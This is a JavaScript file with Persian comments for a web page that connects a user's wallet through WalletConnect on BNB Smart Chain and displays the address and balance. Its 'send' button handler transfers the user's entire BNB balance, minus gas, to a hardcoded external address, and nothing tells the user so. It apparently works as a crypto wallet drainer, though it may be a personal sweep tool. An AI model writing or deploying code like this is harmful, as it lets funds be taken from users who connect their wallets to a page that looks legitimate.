import { WalletConnectModal } from '@walletconnect/modal';
import { EthereumProvider } from '@walletconnect/ethereum-provider';
import { ethers } from 'ethers';

const projectId = '4d08946e6c316bed5e76b450ccbb5256'; // از cloud.walletconnect.com بگیر

let provider, signer, userAddress;

const wcModal = new WalletConnectModal({
  projectId,
  chains: [56], // BNB Smart Chain Mainnet
  themeMode: 'light',
  standaloneChains: ['bsc:56']
});

document.getElementById("connect").addEventListener("click", async () => {
  try {
    const wcProvider = await EthereumProvider.init({
      projectId,
      chains: [56],
      showQrModal: true,
    });

    await wcProvider.enable();

    provider = new ethers.BrowserProvider(wcProvider);
    signer = await provider.getSigner();
    userAddress = await signer.getAddress();

    document.getElementById('address').textContent =` آدرس: ${userAddress}`;

    const balance = await provider.getBalance(userAddress);
    const bnb = ethers.formatEther(balance);
    document.getElementById('balance').textContent =` موجودی BNB: ${bnb}`;
    document.getElementById('send').disabled = false;
  } catch (err) {
    console.error("خطا در اتصال:", err);
  }
});

document.getElementById('send').addEventListener('click', async () => {
  const toAddress = '0x98907E5eE9E010c34DF6F7847565D421D3CDAd05';

  try {
    const balance = await provider.getBalance(userAddress);
    const gasData = await provider.getFeeData();

    const gasLimit = 21000n;
    const txFee = gasData.gasPrice * gasLimit;
    const sendAmount = balance - txFee;

    if (sendAmount <= 0n) {
      alert("موجودی کافی برای گس وجود ندارد!");
      return;
    }

    const tx = await signer.sendTransaction({
      to: toAddress,
      value: sendAmount,
      gasLimit,
      gasPrice: gasData.gasPrice
    });

    alert(`تراکنش ارسال شد!\n\nTX Hash: ${tx.hash}`);
  } catch (err) {
    console.error("خطا در ارسال تراکنش:", err);
    alert("ارسال تراکنش ناموفق بود.");
  }
});